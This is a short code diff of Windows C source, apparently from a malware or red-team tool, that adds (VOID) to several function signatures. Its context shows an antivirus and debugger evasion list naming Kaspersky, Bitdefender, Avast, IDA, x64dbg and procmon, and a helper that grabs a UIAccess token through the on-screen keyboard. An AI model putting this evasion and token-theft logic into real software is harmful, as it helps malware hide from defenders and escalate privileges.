@@ -185,7 +185,7 @@ END:
 	return hResult;
 }
 
-HANDLE GetUiAccessToken()
+HANDLE GetUiAccessToken(VOID)
 {
 	HANDLE hToken = NULL;
 	WCHAR wszOskPath[MAX_PATH];
@@ -467,7 +467,8 @@ CLEANUP:
 	return Result;
 }
 
-BOOL CheckForBlackListProcess() {
+BOOL CheckForBlackListProcess(VOID)
+{
 	LPWSTR AvList[] = {L"kav.exe", L"kav32.exe", L"kavfs.exe", L"kavmm.exe", L"klnagent.exe", L"BITDEFENDER.exe", L"bdc.exe", L"bdlite.exe", L"bdagent.exe", L"AvastSvc.exe", L"afwServ.exe", L"ashserv.exe"};
 	LPWSTR DebugList[] = { L"ida.exe", L"ida64.exe", L"DbgX.Shell.exe", L"x64dbg.exe", L"x32dbg.exe", L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe", L"apimonitor-x86.exe", L"pin.exe", L"SystemInformer.exe", L"windbg.exe" };
 	BOOL Result = FALSE;
@@ -485,7 +486,7 @@ BOOL CheckForBlackListProcess() {
 	return FALSE;
 }
 
-LPSTR GetCurrentProcessUserSID()
+LPSTR GetCurrentProcessUserSID(VOID)
 {
 	HANDLE hToken = NULL;
 	PTOKEN_USER pTokenInfo = NULL;;
@@ -529,7 +530,7 @@ CLEANUP:
 	return lpResult;
 }
 
-LPSTR GetCurrentProcessGroupSID()
+LPSTR GetCurrentProcessGroupSID(VOID)
 {
 	HANDLE hToken = NULL;
 	PTOKEN_PRIMARY_GROUP pTokenInfo = NULL;;
